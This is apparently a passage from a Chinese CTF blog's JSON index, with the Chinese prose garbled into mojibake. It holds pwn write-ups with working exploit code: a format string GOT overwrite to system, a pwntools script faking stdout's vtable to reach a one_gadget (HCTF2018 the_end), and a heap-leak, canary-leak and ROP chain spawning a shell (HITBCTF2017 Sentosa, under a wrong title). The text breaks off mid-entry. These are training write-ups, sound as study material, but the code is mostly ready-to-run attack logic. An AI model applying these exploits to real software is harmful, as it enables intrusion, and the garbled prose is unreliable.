ç”±äºå‰é¢å·²ç»è¾“å…¥äº†p32(printf_got)+p32(printf_got1)+p32(printf_got2)+p32(printf_got3)ï¼Œè¿™äº›åœ¨æ²¡æœ‰é‡åˆ°%ä¹‹å‰ä¸€å®šä¼šè¢«æ‰“å°å‡ºæ¥ï¼Œå…±è®¡16ä¸ªå­—èŠ‚ï¼Œè€Œæˆ‘ä»¬éœ€è¦è®©å®ƒæ€»å…±æ‰“å°å‡º0x20ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬å†æ‰“å°(0x20-16)ä¸ªå­—èŠ‚ã€‚\n\nâ‘¡åŒæ ·ï¼Œç”±äºå‰é¢å·²ç»æ‰“å°äº†0x20ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬æ€»å…±éœ€è¦æ‰“å°0x83ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥åº”è¯¥å†è®©ç¨‹åºæ‰“å°%(0x83-0x20)ä¸ªå­—èŠ‚ï¼Œä¹‹åé“ç†ç›¸åŒã€‚\n\n```\n#æ³¨é‡Šå¤´\n\n\npayload += \"%\"\npayload += str(0x20-16)\npayload += \"c%5$hhn\"\n#å†™å…¥0x20åˆ°åœ°å€print_got\n\npayload += \"%\"\npayload += str(0x83-0x20)\npayload += \"c%6$hhn\"\n#å†™å…¥0x83åˆ°åœ°å€print_got+1\n\npayload += \"%\"\npayload += str(0x104-0x83)\npayload += \"c%7$hhn\"\n#å†™å…¥0x04åˆ°åœ°å€print_got+2ï¼Œ0x104è¢«æˆªæ–­ä¸º04\n\npayload += \"%\"\npayload += str(0x108-0x104)\npayload += \"c%8$hhn\"\n#å†™å…¥0x08åˆ°åœ°å€print_got+3ï¼Œ0x108è¢«æˆªæ–­ä¸º08\n```\n\nâ–²ä¸ºäº†ä¾¿äºç†è§£ï¼Œä¸‹é¢ä»£ç ä¹Ÿè¡Œï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npayload = p32(printf_got+1) \n#ä½¿ç”¨hhnå†™å…¥ï¼Œåˆ†åˆ«å¯¹åº”å¾…å†™å…¥çš„ç¬¬3ï¼Œ4ï¼Œ2ï¼Œ1å­—èŠ‚\npayload += p32(printf_got)\npayload += p32(printf_got+2)\npayload += p32(printf_got+3)\n\npayload += \"%\"\npayload += str(0x83-16) #è¢«å†™å…¥çš„æ•°æ®ï¼Œæ³¨æ„å››ä¸ªåœ°å€é•¿åº¦æ˜¯16ï¼Œéœ€è¦å‡æ‰\npayload += \"c%5$hhn\"\n\npayload += \"%\"\npayload += str(0x120-0x83)\npayload += \"c%6$hhn\"\n\npayload += \"%\"\npayload += str(0x204-0x120) #ç”±äºæ˜¯hhnæ‰€ä»¥ä¼šè¢«æˆªæ–­ï¼Œåªç•™åä¸¤ä½\npayload += \"c%7$hhn\"\n\npayload += \"%\"\npayload += str(0x208-0x204)\npayload += \"c%8$hhn\"\n```\n\n6.å…¶å®å¯ä»¥ç›´æ¥ä½¿ç”¨ç±»Fmtstrï¼Œæ•ˆæœä¸€æ ·ï¼Œå°†Payloadæ›¿æ¢æˆä¸‹åˆ—ä»£ç å³å¯\n\npayload = fmtstr_payload(5, {printf_got:system_plt})\n\n7.ä¹‹åå†io.sendline('/bin/sh\\x00')ï¼Œå³å¯getshell\n\n \n\nâ˜…64ä½ç¨‹åº\n\n1.ç”±äº64ä½ï¼Œä¼ å‚çš„é¡ºåºä¸ºrdi, rsi, rdx, rcx, r8, r9ï¼Œæ¥ä¸‹æ¥æ‰æ˜¯æ ˆï¼Œæ‰€ä»¥åç§»é‡åº”è¯¥æ˜¯6æŒ‡å‘æ ˆé¡¶ã€‚ä¹‹åè€ƒè™‘ä½¿ç”¨fmtstræ¥ç›´æ¥æ„é€ è·å–ï¼š\n\npayload = fmtstr_payload(6, {printf_got:system_plt})\n\nä½†æ˜¯è¿™ä¸ªæ–¹æ³•ä¼šå‡ºé”™ï¼Œå› ä¸ºåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬çš„åœ°å€å¦‚ä¸‹\n\n```\n#æ³¨é‡Šå¤´\n\nprintf_got = 0x00601020\nsystem_plt = 0x00400460\n```\n\néœ€è¦å†™å…¥åœ°å€printf_gotçš„é¦–ä¸¤ä½æ˜¯00ï¼Œä¸”ä»¥p64å½¢å¼å‘é€ï¼Œæ‰€ä»¥å…ˆå‘é€çš„æ˜¯0x20ï¼Œ0x10ï¼Œ0x60ï¼Œ0x00ï¼Œ0x00.......è€ŒReadå‡½æ•°è¯»åˆ°0x00å°±ä¼šæˆªæ–­ï¼Œé»˜è®¤è¿™æ˜¯å­—ç¬¦ä¸²ç»“æŸäº†ï¼Œæ‰€ä»¥ä¹‹åçš„éƒ½æ— æ•ˆäº†ã€‚\n\n2.é‚£ä¹ˆè€ƒè™‘æ‰‹åŠ¨æ–¹å¼ï¼Œå°†p64(printf_got)æ”¾åœ¨payloadçš„æœ«å°¾ï¼Œè¿™æ ·å°±åªæœ‰æœ€åæ‰ä¼šè¯»åˆ°0x00ï¼Œå…¶å®ƒçš„æœ‰æ•ˆæ•°æ®éƒ½èƒ½è¯»å…¥ã€‚\n\n3.ä½¿ç”¨æ‰‹åŠ¨æ–¹å¼å°±éœ€è¦å†æ¬¡è®¡ç®—åç§»é‡ï¼Œæˆ‘ä»¬çš„payloadæ„æˆåº”è¯¥æ˜¯\n\npayload = â€%â€+str(system_plt)+â€c%8$llnâ€ + p64(printf_got)\n\nè¿™é‡Œåç§»é‡ä¸º8æ˜¯å› ä¸ºç»è¿‡è°ƒè¯•å‘ç°æˆ‘ä»¬çš„è¾“å…¥ä»æ ˆé¡¶å¼€å§‹è®¡ç®—ï¼Œä¹Ÿå°±æ˜¯ä»æ ˆé¡¶å¼€å§‹ï¼Œä¸€å…±è¾“å…¥äº†\n\n1(%) + 7(0x400460è½¬æ¢æˆåè¿›åˆ¶ä¸º4195424ï¼Œä¹Ÿå°±æ˜¯7ä¸ªå­—èŠ‚) + 7(â€œc%8$llnâ€) + 8(p64_printf_got)=23ä¸ªå­—èŠ‚ã€‚\n\nç»è¿‡è®¡ç®—æˆ‘ä»¬å‘ç°ï¼Œp64å‰é¢çš„å­—èŠ‚æ•°ä¸º15ä¸ªå­—èŠ‚ï¼Œä¸è¶³8çš„å€æ•°ï¼Œè¿™æ ·ä¼šå¯¼è‡´printf_gotçš„æœ€åä¸€ä¸ªå­—èŠ‚20è¢«æˆªæ–­è‡³åç§»é‡ä¸º7çš„ä½ç½®ï¼Œä»è€Œä½¿å¾—åç§»é‡ä¸º8çš„ä½ç½®åªæœ‰6010ï¼Œå¯¼è‡´å‡ºé”™ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦å¡«å……ä¸€ä¸ªå­—èŠ‚è¿›å»ï¼Œè®©å®ƒä¸ä¼šè¢«æˆªæ–­ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191543645.png)\n\n```\n#æ³¨é‡Šå¤´\n\npayload = â€a%â€ + str(system_plt-1)+â€c%8$llnâ€ + p64(printf_got)\n```\n\nåŠ å…¥ä¸€ä¸ªå­—èŠ‚aå°±å¯ä»¥ä½¿å¾—åœ¨å‚æ•°åç§»é‡ä¸º6å’Œ7çš„ä½ç½®ä¸­ä¸ä¼šæˆªæ–­0x601020ã€‚åŒæ—¶åŠ å…¥å­—èŠ‚aå°±è¦ä½¿system_plt-1æ¥æ»¡è¶³æœ€ç»ˆæ‰“å°çš„å­—ç¬¦ä¸ªæ•°ä¸º0x00400460ï¼Œä»è€Œæ‰èƒ½æˆåŠŸå°†0x00400460(system_plt)å†™å…¥åˆ°0x00601020(printf_got)\n\n5.å®Œæˆpayloadä¹‹åï¼Œå†æ¬¡å¾ªç¯è¿›å…¥ï¼Œè¾“å…¥io.sendline('/bin/sh\\x00')åinteractive()å³å¯getshell\n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["Fmstr"],"categories":["PWN","Fmstr0x6"]},{"title":"HCTF2018_the_end","url":"/2021/08/14/HCTF2018_the_end/","content":"\n1.å¸¸è§„checksecï¼Œé™¤äº†canaryä¹‹å¤–ä¿æŠ¤å…¨å¼€ã€‚IDAæ‰“å¼€æ‰¾æ¼æ´ï¼Œæ²¡ä»€ä¹ˆæ¼æ´ï¼Œå°±æ˜¯ç¨‹åºä¼šæ³„éœ²å‡ºsleepçš„åœ°å€ï¼Œç„¶åè®©æˆ‘ä»¬åœ¨ä»»æ„åœ°æ–¹å†™å…¥5ä¸ªå­—èŠ‚ï¼Œå¹¶ä¸”ç»™äº†libcæ–‡ä»¶ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç®—å‡ºlibcåŸºåœ°å€ï¼Œç‰ˆæœ¬ä¸º2.23ã€‚\n\nprintf(\"here is a gift %p, good luck ;)\\n\", &sleep);\n\n2.ç¨‹åºæœ€åè°ƒç”¨exit(1337)ï¼Œä¸¤ç§æ–¹æ³•ï¼š\n\n(1)exitä¼šæ— æ¡ä»¶é€šè¿‡_IO_2_1_stdout_ç»“æ„ä½“è°ƒç”¨vtableè™šè¡¨ä¸­çš„_setbufå‡½æ•°ã€‚\n\n(2)exitä¼šé€šè¿‡_IO_2_1_stdout_ç»“æ„ä½“è°ƒç”¨vtableè™šè¡¨ä¸­çš„_overflowå‡½æ•°ï¼Œä½†éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n_IO_FILE_plus._mode <= 0\n_IO_FILE_plus._IO_write_ptr > _IO_FILE_plus._IO_write_base\n```\n\næ‰€ä»¥æˆ‘ä»¬ä¼ªé€ çš„_IO_FILE_plusç»“æ„ä½“å°±éœ€è¦æ»¡è¶³ä¸Šè¿°æ¡ä»¶\n\n(3)exitä¼šè°ƒç”¨_rtld_globalç»“æ„ä½“ä¸­çš„_dl_rtld_lock_recursiveå‡½æ•°ï¼Œä¸ç”¨æ»¡è¶³æ¡ä»¶ã€‚\n\n3.ä¸‰ç§æ–¹æ³•æ”»å‡»æ€è·¯:\n\n(1)ç”±äºä¼šè°ƒç”¨_setbufå‡½æ•°ï¼Œvtableä½äºlibcæ•°æ®æ®µä¸Šä¸å¯å†™éƒ¨åˆ†ï¼Œæ— æ³•ç›´æ¥ä¿®æ”¹vtableå¯¹åº”çš„_IO_file_jumpsä¸­çš„å‡½æ•°æŒ‡é’ˆã€‚é‚£ä¹ˆå¯ä»¥ä¼ªé€ _IO_2_1_stdout_ä¸­çš„vtableæŒ‡é’ˆï¼Œåˆ©ç”¨2å­—èŠ‚ä¿®æ”¹vtableæŒ‡é’ˆçš„å€’æ•°ä¸¤ä¸ªå­—èŠ‚ï¼Œä½¿å…¶æŒ‡å‘ä¸€ä¸ªå¯è¯»å¯å†™å†…å­˜ï¼Œå½¢æˆä¸€ä¸ªfake_IO_file_jumpsï¼Œç„¶ååœ¨è¯¥å†…å­˜å¯¹åº”_setbufå‡½æ•°åç§»å¤„ä¼ªé€ one_gadgetåœ°å€ã€‚\n\n```\nfrom pwn import *\nlibc=ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\")\np = process('./the_end')\n\nvtable_offset = 0xd8\n_setbuf_offset = 0x58\nfake_vtable_offset = 0x3c5588\n#è¿™ä¸ªéœ€è¦è‡ªå·±è°ƒè¯•æ‰¾ï¼Œå¹¶ä¿è¯åç§»_setbuf_offsetå¤„ä¿®æ”¹ä¹‹åç¨‹åºä¸ä¼šç›´æ¥å´©æºƒ\n\nsleep_addr = p.recvuntil(', good luck',drop=True).split(' ')[-1] \nlibc_base = long(sleep_addr,16) - libc.symbols['sleep']\n\none_gadget = libc_base + 0xf02b0\n_IO_2_1_stdout_vtable_addr = libc_base + libc.sym['_IO_2_1_stdout_'] + vtable_offset\n\nfake_vtable = libc_base + fake_vtable_offset\nfake_vtable_setbuf_addr = libc_base + fake_vtable_offset + _setbuf_offset\n\nprint 'libc_base: ',hex(libc_base)\nprint 'one_gadget:',hex(one_gadget)\n\nfor i in range(2):\n    p.send(p64(_IO_2_1_stdout_vtable_addr+i))\n    p.send(p64(fake_vtable)[i])\n\nfor i in range(3):\n    p.send(p64(fake_vtable_setbuf_addr+i))\n    p.send(p64(one_gadget)[i])\n\np.sendline(\"exec /bin/sh 1>&0\")\n\np.interactive()\n```\n\n \n\n(2)_IO_FILE_plusç»“æ„ä½“ä½äºlibcæ•°æ®æ®µä¸Šå¯è¯»å¯å†™å†…å­˜å¤„ï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹ï¼Œä½†æ˜¯ä¿®æ”¹å­—èŠ‚æ•°åªæœ‰5ä¸ªï¼ŒæŒ‰ç…§ç¬¬ä¸€ç§æ–¹æ³•ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n_IO_FILE_plus._mode <= 0  //è¯¥æ¡ä»¶è‡ªåŠ¨å°±ä¼šæ»¡è¶³\n_IO_FILE_plus._IO_write_ptr > _IO_FILE_plus._IO_write_base//è¯¥æ¡ä»¶éœ€è¦è®¾ç½®1ä¸ªå­—èŠ‚\n```\n\nå†åˆ©ç”¨1ä¸ªå­—èŠ‚ä¿®æ”¹vtableçš„å€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚ï¼Œä¼ªé€ vtableæŒ‡é’ˆï¼Œç„¶ååˆ©ç”¨3ä¸ªå­—èŠ‚åœ¨è¯¥å†…å­˜å¯¹åº”_setbufå‡½æ•°åç§»å¤„ä¼ªé€ one_gadgetåœ°å€ã€‚\n\n(3)_rtld_globalç»“æ„ä½“ä½äºlibcæ•°æ®æ®µä¸Šå¯è¯»å¯å†™å†…å­˜å¤„ï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹ã€‚é‚£ä¹ˆç›´æ¥ä¿®æ”¹_dl_rtld_lock_recursiveå‡½æ•°æŒ‡é’ˆæŒ‡å‘one_gadgetå°±è¡Œäº†ã€‚\n\n \n\næ–¹æ³•(2)å’Œæ–¹æ³•(3)å‚è€ƒï¼š\n\nhttps://blog.csdn.net/Mira_Hu/article/details/103736917\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://wiki.x10sec.org/pwn/linux/io_file/fake-vtable-exploit-zh/\n\n \n","tags":["First"],"categories":["PWN","FSOP0xe"]},{"title":"HCTF2018_the_end","url":"/2021/08/14/HITBCTF2017 Sentosa/","content":"\n1.å¸¸è§„checksecï¼Œä¿æŠ¤å…¨å¼€ã€‚IDAæ‰“å¼€æ‰¾æ¼æ´ï¼Œåœ¨sub_BF0()å‡½æ•°ï¼Œå³è¯»å…¥nameçš„å‡½æ•°ä¸­å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191514947.jpeg)\n\nåˆ©ç”¨ç»“æ„ä½“é‡æ•´åŒ–\n\n```\n#æ³¨é‡Šå¤´\n\nstruct project{\nint length;\nchar name[length];\nint check;\nint price;\nint area;\nint capactity;\n}project;\n\nstruct project* projects[0x10];\n```\n\nç”±äºlengthæ˜¯ç”±ç”¨æˆ·è¾“å…¥å½±å“çš„ï¼Œé‚£ä¹ˆç»“æ„ä½“çš„å¤§å°ä¹Ÿæ˜¯ä¸å›ºå®šçš„ï¼Œæ‰€ä»¥æå‡ºæ¥å›ºå®šçš„å½¢æˆproject_behindç»“æ„ä½“æ–¹ä¾¿æŸ¥çœ‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nstruct project_behind{\nint check;\nint price;\nint area;\nint capactity;\n}project_behind;\n```\n\nå¾—åˆ°å¦‚ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191514952.jpeg)\n\nå…¶å®é™…æ„ä¹‰å°±æ˜¯è¯»å…¥length-1ä¸ªå­—èŠ‚ï¼Œç„¶åå°†æœ€åä¸€ä¸ªå­—èŠ‚è®¾ç½®ä¸º\\x00ã€‚ä½†æ˜¯è¿™é‡Œæ²¡æœ‰æ£€æŸ¥data_lengthï¼Œå³å¦‚æœä¼ å…¥çš„lengthä¸º0ï¼Œé‚£ä¹ˆdata_lengthç”±äºæ˜¯intç±»å‹ï¼Œè€Œiä¹Ÿæ˜¯intç±»å‹ï¼Œé‚£ä¹ˆiä»0å¼€å§‹åŠ éœ€è¦åŠ 0xfffff.....è¿™ä¹ˆå¤šæ‰ä¼šæŠµè¾¾-1ï¼Œç›¸å½“äºå¯ä»¥è¯»å…¥ä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œé€ æˆæ ˆæº¢å‡ºã€‚\n\n2.æ ˆæº¢å‡ºï¼Œä¿æŠ¤å…¨å¼€ï¼ŒcanaryæŠŠç€æ ˆæº¢å‡ºçš„å£å­ï¼Œæ‰€ä»¥å¾—å…ˆæƒ³åŠæ³•æ³„éœ²canaryã€‚\n\n(1)é¢˜ç›®è™½ç„¶æ‰“å°äº†nameï¼Œä½†æ˜¯æ‰“å°çš„æ˜¯å †ä¸Šçš„nameï¼Œæ²¡åŠæ³•åˆ©ç”¨nameè¿ä¸Šcanaryæ¥æ³„éœ²ã€‚\n\n(2)è¶³å¤Ÿé•¿çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯æ²¡æœ‰è¿™ä¸ªè¿›ç¨‹æ˜¯forkåˆ›å»ºï¼Œè€Œä¸æ˜¯è¿›ç¨‹pthreadåˆ›å»ºï¼Œæ‰€ä»¥æ²¡åŠæ³•æº¢å‡ºè¶³å¤Ÿé•¿æ¥è¦†ç›–TSLä¸­çš„canaryã€‚\n\né‚£ä¹ˆæ—¢ç„¶èƒ½æ§åˆ¶æ ˆï¼Œå°±ä»æ ˆä¸Šå…¥æ‰‹ï¼Œå¯»æ‰¾addå‡½æ•°æ ˆä¸Šçš„æœ‰ç”¨æ•°æ®ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nchar *project; // [rsp+6Ah] [rbp-3Eh]\n-------------------------------------------------------------------\nproject = malloc(length + 21LL);\n--------------------------------------------------------------------\nprojects[idx] = project;\n```\n\nå¯ä»¥çœ‹åˆ°å¯¹IDAé‡æ•´åŒ–ä¹‹åçš„å†…å®¹ä¸­ï¼Œprojectå˜é‡ä½äºæ ˆä¸Šï¼Œé‡Œé¢ä¿å­˜ç€projectè¿™ä¸ªchunkçš„é¦–åœ°å€ï¼Œæœ€åä¼šè¢«æ”¾å…¥projectsè¿™ä¸ªæ•°ç»„ä¸­ã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬ä¿®æ”¹æ‰projectå˜é‡çš„å†…å®¹ï¼Œå°†å…¶æŒ‡å‘å…¶å®ƒçš„åœ°å€ï¼Œé‚£å°±å®ç°ä»»æ„åœ°å€å¯å†™äº†ã€‚\n\n3.ä½†æ˜¯è¿™é‡Œä¿æŠ¤å…¨å¼€ï¼Œä¸€ä¸ªæœ‰ç”¨åœ°å€éƒ½æ²¡æœ‰ã€‚å¯ä»¥æ³¨æ„åˆ°projectå˜é‡æœ€åä¼šä¿å­˜ä¸€ä¸ªå †åœ°å€ï¼Œç”±äºå¤§ç«¯åºï¼Œå¦‚æœæˆ‘ä»¬å°†è¿™ä¸ªå †åœ°å€çš„æœ€åä¸€ä¸ªå­—èŠ‚å˜æˆ\\x00ï¼Œé‚£ä¹ˆè¿™ä¸ªchunkå°±ä¼šæŒ‡å‘ç¬¬ä¸€ä¸ªchunkï¼Œä¹Ÿå°±æ˜¯project[0]ï¼Œå¦‚æœç¬¬ä¸€ä¸ªchunkå¤„äºé‡Šæ”¾çŠ¶æ€ï¼Œå°±å¯ä»¥é€šè¿‡ç¨‹åºçš„viewå‡½æ•°æ¥å°†è¿™ä¸ªchunkçš„fdæŒ‡é’ˆæ‰“å°å‡ºæ¥ã€‚\n\n4.ç”±äºä½¿ç”¨æº¢å‡ºçš„å‰ææ¡ä»¶æ˜¯lengthä¸º0ï¼Œæ‰€ä»¥malloc(21)å¯¹åº”chunkå¤§å°ä¸º0x20ï¼Œé‡Šæ”¾åä¼šè¿›å…¥fastbinsä¸­ï¼Œfastbinsä¸­chunkçš„fdä¿å­˜ä¸‹ä¸€ä¸ªchunkçš„å¤´åœ°å€ã€‚é‚£ä¹ˆå°±å¯ä»¥æ‰“å°å‡ºfdä¸Šçš„å†…å®¹ï¼Œæ³„éœ²å‡ºå †åœ°å€ã€‚\n\n5.ç°åœ¨å¯ä»¥æ§åˆ¶å †å†…å®¹äº†ï¼Œé‚£ä¹ˆé€šè¿‡æ­£å¸¸æ‰‹æ®µç”³è¯·å‡ ä¸ªchunkï¼Œåœ¨é‡Œé¢æ„é€ ä¸€ä¸ªfakechunkï¼Œä¹‹ååˆ©ç”¨æº¢å‡ºæ¼æ´æ§åˆ¶è¿™ä¸ªfakechunkï¼Œå°†å…¶é‡Šæ”¾æ‰ï¼Œä½¿å…¶è¿›å…¥unsortedbinä¸­ã€‚å†åˆ©ç”¨æº¢å‡ºæ¼æ´æ§åˆ¶è¿™ä¸ªè¢«é‡Šæ”¾çš„fakechunkï¼Œæ‰“å°å‡ºå…¶fdæŒ‡é’ˆï¼Œå°±æ˜¯main_aren+88çš„åœ°å€ï¼Œä»è€Œæ³„éœ²Libcåœ°å€ã€‚\n\n6.ç°åœ¨æœ‰äº†libcåœ°å€å’Œæ ˆæº¢å‡ºï¼Œéœ€è¦çªç ´canaryï¼Œçªç ´å£æ˜¯environè¿™ä¸ªå˜é‡ã€‚environè¿™ä¸ªå˜é‡ä»ç¨‹åºåŠ è½½æ—¶ä¿å­˜åœ¨libcæ•°æ®æ®µä¸Šï¼Œä½†æ˜¯å®ƒçš„å†…å®¹ä¿å­˜çš„æ˜¯æ ˆåœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æº¢å‡ºæ¼æ´æ‰“å°å‡ºenvironä¸­çš„æ ˆåœ°å€ã€‚å¾—åˆ°æ ˆåœ°å€ä¹‹åå°±å¯ä»¥ç”¨gdbè®¡ç®—åç§»ï¼Œé€‰å–viewå‡½æ•°æ ˆä¸Šçš„canaryï¼Œå†åˆ©ç”¨æº¢å‡ºæ¼æ´æ‰“å°å‡ºcanaryçš„å€¼ã€‚\n\n7.ä¹‹åæœ‰äº†libc,canary,æ ˆæº¢å‡º,å°±æ˜¯å¸¸è§„çš„getshelläº†ã€‚\n\n8.ç¼–å†™exp:\n\n(1)å‰ç½®å¢åˆ æ”¹æŸ¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef start_proj(length, name, price, area, capacity):\n    io.sendlineafter(\"Exit\\n\", '1')\n    io.sendlineafter(\"name: \", str(length))\n    io.sendlineafter(\"name: \", name)\n    io.sendlineafter(\"price: \", str(price))\n    io.sendlineafter(\"area: \", str(area))\n    io.sendlineafter(\"capacity: \", str(capacity))\n\ndef view_proj():\n    io.sendlineafter(\"Exit\\n\", '2')\n\ndef cancel_proj(idx):\n    io.sendlineafter(\"Exit\\n\", '4')\n    io.sendlineafter(\"number: \", str(idx))\n```\n\n(2)æ³„éœ²å †åœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´ \n\ndef leak_heap():\n    global heap_base\n\n    start_proj(0, 'A', 1, 1, 1)        #chunk0\n    start_proj(0, 'A'*0x5a, 1, 1, 1)   #chunk1\n    #æº¢å‡ºä¸€ä¸ªå­—èŠ‚ï¼Œä¿®æ”¹æ ˆä¸Šprojectçš„æœ€åä¸€ä¸ªå­—èŠ‚ä¸º\\x00,ä½¿å…¶æŒ‡å‘chunk0\n    start_proj(0, 'A', 1, 1, 1)        #chunk2\n    cancel_proj(2)\n    cancel_proj(0)\n\n    view_proj()\n    #æ‰“å°chunk1å°±ç›¸å½“äºæ‰“å°chunk0çš„å†…å®¹ï¼Œå…¶ä¸­åŒ…å«fdæŒ‡é’ˆéƒ¨åˆ†å†…å®¹\n\n    io.recvuntil(\"Capacity: \")\n    leak = int(io.recvline()[:-1], 10) & 0xffffffff\n    heap_base = (0x55<<40) + (leak<<8) # 0x55 or 0x56\n    #ç”±äºç¨‹åºçš„å…³ç³»ï¼Œåªèƒ½æ‰“å°å‡º0x55ä¹‹åçš„å†…å®¹ï¼Œå…±4ä¸ªå­—èŠ‚ï¼Œç”±äºå †åœ°å€é«˜ä½ä¸€èˆ¬éƒ½æ˜¯0x55æˆ–0x56ï¼Œæ‰€ä»¥ç›´æ¥åŠ ä¸Šå³å¯ï¼Œæœ€åè¿˜å¾—ä¹˜ä¸Š0x100ï¼Œå› ä¸ºæ²¡æœ‰æ³„éœ²å‡ºæ¥ï¼Œéœ€è¦è°ƒè¯•çœ‹çœ‹ã€‚\n\n    log.info(\"heap base: 0x%x\" % heap_base)\n```\n\n(3)æ³„éœ²libcåœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´ \n\ndef leak_libc():\n    global libc_base\n\n    start_proj(0xf, 'A', 0xd1, 0, 0x64)                       #chunk0\n    #chunk0ç”¨æ¥ä¿®æ”¹fakechunkçš„sizeä½ä¸º0xd1,å ä½0x30,ä½äºheap_base+0x60\n\n    start_proj(0x50, '\\x01', 1, 1, 1)                         #chunk2\n    #chunk2å ä½0x70ç”¨,ä½äºheap_base+0x90,'\\x01'ä¸çŸ¥é“å¹²å•¥çš„ï¼Œ'\\x00'éšä¾¿å•¥éƒ½å¯ä»¥\n\n    start_proj(0x50, 'A'*0x44+'\\x21', 1, 1, 1)                #chunk3\n    #chunk3ç”¨æ¥ä¿®æ”¹fakechunkçš„sizeä½ï¼Œå ä½0x70,ä½äºheap_base+0x100\n\n    start_proj(0, 'A'*0x5a + p64(heap_base+0x90), 1, 1, 1)    #chunk4\n    #chunk4ä¿®æ”¹chunk4æŒ‡å‘heap_base+0x90ï¼Œå ä½0x20,ä½äºheap_base\n\n    start_proj(0, 'A'*0x5a + p64(heap_base+0x8b), 1, 1, 1)    #chunk5\n    #chunk5å ä½0x20,ä¿®æ”¹chunk5æŒ‡å‘heap_base+0x8b,ä½äºheap_base+0x40\n\n    #å°†fakechunkæ”¾å…¥unsortedbinä¸­\n    cancel_proj(4)\n    \n    #è·å¾—libcåœ°å€\n    view_proj()\n\n    #ç”±äºä¸€æ¬¡åªèƒ½æ³„éœ²4ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥éœ€è¦ä¸¤éƒ¨åˆ†æ‹¼æ¥\n    for i in range(5):\n        io.recvuntil(\"Area: \")\n    leak_low = int(io.recvline()[:-1], 10) & 0xffffffff\n    io.recvuntil(\"Capacity: \")\n    leak_high = int(io.recvline()[:-1], 10) & 0xffff\n    libc_base = leak_low + (leak_high<<32) - 0x3c3b78\n\n    log.info(\"libc base: 0x%x\" % libc_base)\n```\n\nâ‘ chunk0ä¸­çš„0x64ç”¨æ¥è¿‡ç¨‹åºä¸­åˆ é™¤projectå‡½æ•°çš„æ£€æŸ¥ï¼š\n\nif ( *(project + *project + 5) != 1 )\n\nåªè¦è®¡ç®—ä¹‹åcheckä¸º1å³å¯ï¼Œå®æµ‹0x60ä¹Ÿå¯ä»¥ã€‚\n\nâ‘¡chunk3ä¸­çš„\\x21ä¸ºäº†è¿‡glibcä¸­çš„æ£€æŸ¥ã€‚\n\nâ‘¢chunk5ä¸ºäº†å¡«æ»¡ä¹‹å‰çš„ç´¢å¼•ä¸º2çš„projectï¼Œæ–¹ä¾¿ä¹‹åè¿ä½œã€‚\n\n(4)æ³„éœ²canary:\n\n```\n#æ³¨é‡Šå¤´ \n\ndef leak_stack_canary():\n    global canary\n\n    environ_addr = libc.symbols['__environ'] + libc_base\n    log.info(\"__environ address: 0x%x\" % environ_addr)\n\n    start_proj(0, 'A'*0x5a + p64(environ_addr - 9) , 1, 1, 1) # 4\n\n    view_proj()\n    for i in range(5):\n        io.recvuntil(\"Price: \")\n    leak_low = int(io.recvline()[:-1], 10) & 0xffffffff\n    io.recvuntil(\"Area: \")\n    leak_high = int(io.recvline()[:-1], 10) & 0xffff\n    stack_addr = leak_low + (leak_high<<32)\n    canary_addr = stack_addr - 0x130\n\n    log.info(\"stack address: 0x%x\" % stack_addr)\n    log.info(\"canary address: 0x%x\" % canary_addr)\n\n    start_proj(0, 'A'*0x5a + p64(canary_addr - 3), 1, 1, 1) # 6\n\n    view_proj()\n    for i in range(7):\n        io.recvuntil(\"Project: \")\n    canary = (u64(io.recvline()[:-1] + \"\\x00\"))<<8\n\n    log.info(\"canary: 0x%x\" % canary)\n```\n\n(5)æ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€ä¸ºsystemï¼Œpop rdiä¼ å‚getshell\n\n```\n#æ³¨é‡Šå¤´ \n\npop_rdi_ret = libc_base + 0x21102\nbin_sh = libc_base + next(libc.search('/bin/sh\\x00'))\nsystem_addr = libc_base + libc.symbols['system']\n\npayload = \"A\" * 0x68\npayload += p64(canary) # canary\npayload += \"A\" * 0x28\npayload += p64(pop_rdi_ret) # return address\npayload += p64(bin_sh)\npayload += p64(system_addr) # system(\"/bin/sh\")\n\nstart_proj(0, payload, 1, 1, 1)\n\nio.interactive()\n```\n\n \n\nâ–²è¿™é“é¢˜éœ€è¦å¾ˆå¤šè°ƒè¯•çš„åœ°æ–¹ï¼Œå®¹æ˜“å¤´å¤§å´©æºƒã€‚\n\nå‚è€ƒèµ„æ–™ï¼š\n\nctf-all-in-one\n\n \n\n \n\n \n\n \n\n \n\n \n\n \n","tags":["Heap-Skill"],"categories":["PWN","pwnå †-åˆ·é¢˜æŠ€å·§"]},{"title":"HITB GSEC CTF 2017-1000levels","url":"/2021/08/14/HITB GSEC CTF 2017-1000levels/","content":"\n1.ä¸ä¹‹å‰BCTF 